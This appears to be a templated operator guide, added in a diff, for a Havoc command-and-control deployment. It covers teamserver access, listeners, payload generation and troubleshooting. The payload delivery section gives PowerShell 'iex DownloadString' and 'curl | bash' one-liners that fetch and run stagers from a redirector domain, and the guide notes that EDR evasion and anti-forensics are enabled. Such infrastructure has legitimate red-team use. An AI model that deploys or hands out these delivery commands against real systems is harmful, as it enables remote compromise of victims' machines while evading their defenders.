@@ -1,0 +1,77 @@
+HAVOC C2 OPERATIONS GUIDE
+==========================
+
+This guide provides information on using the Havoc C2 framework deployed on
+your infrastructure.
+
+SERVER INFORMATION
+-----------------
+C2 Server IP: {{ c2_ip }}
+Redirector Domain: {{ redirector_domain }}
+Teamserver Port: 40056
+Admin Password: Stored in /opt/havoc/data/profiles/default.yaotl
+
+CONNECTING TO THE TEAMSERVER
+---------------------------
+From your local machine, you should:
+
+1. Make sure Havoc client is installed on your operator system
+2. Connect to the Teamserver:
+   - Host: {{ c2_ip }}
+   - Port: 40056
+   - User: admin
+   - Password: See /opt/havoc/data/profiles/default.yaotl
+
+Note: You can use the team server CLI with:
+$ havoc-teamserver client --username admin --password Your_Password
+
+LISTENERS
+--------
+Two default listeners are configured:
+- HTTP on port 8080
+- HTTPS on port 443 (through the redirector)
+
+You can view and manage listeners through the Havoc client.
+
+GENERATING PAYLOADS
+-----------------
+Pre-generated payloads are available in:
+- /opt/havoc/payloads/
+
+For new payloads:
+1. Connect to the Teamserver using the Havoc client
+2. Navigate to Attack → Payload
+3. Choose your payload options and generate
+
+PAYLOAD DELIVERY
+--------------
+Payloads can be delivered through:
+- HTTP server at {{ c2_ip }}:8443
+- Through the redirector at {{ redirector_domain }}
+
+PowerShell one-liner:
+powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://{{ redirector_domain }}/windows_stager.ps1')"
+
+Linux one-liner:
+curl -s https://{{ redirector_domain }}/linux_stager.sh | bash
+
+OPERATIONAL SECURITY
+------------------
+- All connections go through the redirector
+- Sleep times of agents are randomized (5s default with 30% jitter)
+- Havoc is configured with numerous EDR evasion features
+- Anti-forensics measures are enabled in all payloads
+
+TROUBLESHOOTING
+--------------
+1. If agents can't connect:
+   - Verify DNS for {{ redirector_domain }} points to your redirector
+   - Check NGINX configuration on the redirector
+   - Ensure ports 8080 and 443 are open on respective servers
+
+2. If Havoc Teamserver isn't responding:
+   - Check service status: systemctl status havoc
+   - View logs: journalctl -u havoc
+   - Restart if needed: systemctl restart havoc
+
+3. Use the health command in Havoc client to check Teamserver health
